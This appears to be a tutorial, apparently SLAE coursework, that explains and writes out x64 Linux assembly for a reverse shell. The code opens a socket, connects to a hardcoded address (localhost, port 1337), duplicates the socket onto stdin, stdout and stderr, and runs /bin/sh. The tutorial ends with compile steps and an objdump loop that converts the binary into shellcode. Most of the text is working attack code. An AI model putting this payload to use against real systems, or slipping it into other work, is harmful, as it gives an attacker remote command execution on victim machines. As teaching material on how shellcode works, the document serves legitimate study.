# Reverse-shell assembly x64 Linux

This assembly code creates a socket, connects to a specified IP address and port, and then duplicates the file descriptor for standard input, output, and error. It then executes a shell using the `execve` system call.

There are 4 main steps to creating a reverse shell:

1. Create socket
2. Connect
3. Redirect STDIN, STDOUT, and STDERR
4. Execute received commands

## Creating sockets

The socket is created using the socket system call with the following parameters:

-   rdi: socket family (AF_INET = 2)
-   rsi: socket type (SOCK_STREAM = 1)
-   rdx: protocol (0)

The socket family specifies the domain in which the socket will be used (e.g. `AF_INET` for IPv4). The socket type specifies the type of communication (e.g. `SOCK_STREAM `for a stream socket). The protocol parameter is usually set to 0, which allows the system to choose the appropriate protocol for the specified socket family and type.

After the socket system call is executed, the socket descriptor is stored in the `rax` register and saved in the r9 register for future use.

```assembly
mov rax, 41   ; SYS_SOCKET = 41
    mov rdi, 2    ; socket family AF_INET = 2
    mov rsi, 1    ; SOCK_STREAM = 1
    mov rdx, 0    ; protocol = 0
    syscall
    mov r9, rax   ; sockfd saved
```

## Connections

The connection is established to host using the connect system call with the following parameters:

-   rdi: socket descriptor (saved in r9 from the socket creation step)
-   rsi: address of the sockaddr structure that specifies the IP address and port to connect to
-   rdx: size of the sockaddr structure

The sockaddr structure is created on the stack by pushing the following values:

-   IP address of the server (in network byte order)
-   port number of the server (in network byte order)
-   AF_INET value (2)

Worth to mention that the IP address and port are converted to network byte order by using the `bswap` and `xchg` instructions. The address of the sockaddr structure is then passed as the second parameter to the connect system call.

```assembly
    ; CONNECT
    mov rax, 42   ; SYS_CONNECT = 42
    mov rdi, r9   ; sockfd

        ; sockarrd structure creation
        mov rbx, 0x7f000001 ;IP addres localhost
        bswap rbx ; swaping to network byte order
        push rbx
        mov rbx, 0x539 ; 1337 port
        xchg bl, bh ; swaping to network byte order
        push bx
        push word 0x02  ; pushing AF_INET=2

    mov rsi, rsp    ; sockarrd structure addres from stack
    mov rdx, 16  ; sizeof(serv_addr) ???
    syscall
```

## Redirect STDOUT ...

The duplicate file descriptor part of the code uses the dup2 system call to duplicate the file descriptor of the socket (saved in r9) for standard input, output, and error. This is done using three separate dup2 system calls, each with the following parameters:

-   rdi: old file descriptor (r9)
-   rsi: new file descriptor (0, 1, or 2 for stdin, stdout, and stderr, respectively)

The dup2 system call duplicates the old file descriptor and assigns it to the new file descriptor. In this case, it is used to redirect the standard input, output, and error streams to the socket, so that any input or output from the shell will be sent through the socket.

```assembly
    ; Duplicate file descriptors for stdin, stdout, and stderr
    mov rax, 33  ; SYS_DUP2 = 33
    mov rdi, r9 ; old file descriptor
    mov rsi, 0   ; socfd
    syscall

    mov rax, 33  ; SYS_DUP2 = 33
    mov rdi, r9 ; old file descriptor
    mov rsi, 1   ; socfd
    syscall

    mov rax, 33  ; SYS_DUP2 = 33
    mov rdi, r9 ; old file descriptor
    mov rsi, 2   ; socfd
    syscall
```

## Execve

The run shell section of the code uses the execve system call to execute a shell. The execve system call takes the following parameters:

-   rdi: pathname of the file to execute
-   rsi: argument vector (an array of pointers to null-terminated strings)
-   rdx: environment vector (an array of pointers to null-terminated strings)

In this case, the pathname of the file to execute is the string "/bin/sh", which is stored in the ".rodata" section of the code. The argument and environment vectors are both set to 0 (NULL). This causes the execve system call to execute the shell with no arguments and no environment variables.

After the execve system call is executed, the shell will be run and will be able to receive and execute commands through the socket.

```assembly
    ; RUN SHELL
    mov rax, 59  ; SYS_EXECVE = 59
    lea rdi, [shell]
    xor rsi, rsi ; NULL, const char *const argv[]("//bin/sh", "//bin/sh", 0)
    xor rdx, rdx ; NULL, const char *const envp[] (0 or 0x00)
    syscall
```

## Compilation

To compile I used these commands

```sh
nasm -f elf64 rev.s
ld -o rev.bin rev.o
```

> GAS: as –o program.o program.s

> NASM: nasm –f elf –o program.o program.asm

> Linking (common to both kinds of assembler): ld –o program program.o

> Linking when an external C library is to be used: ld –-dynamic-linker /lib/ld-linux.so.2 –lc –o program program.o

## Notes

THis can be as base for shell code if for example \_start is substututed with function, then compiled and converted to shellcode like this

```assembly
for i in $(objdump -D reverse | grep "^ "|cut -f2); do echo -n '\\x'$i; done; echo
```

# References

-   https://medium.com/@bytesoverbombs/x64-slae-assignment-2-reverse-shell-c4b0ace4e34e
-   Values for flags https://github.com/openbsd/src/blob/master/sys/sys/socket.h
-   https://medium.com/@bytesoverbombs/x64-slae-assignment-2-reverse-shell-c4b0ace4e34e
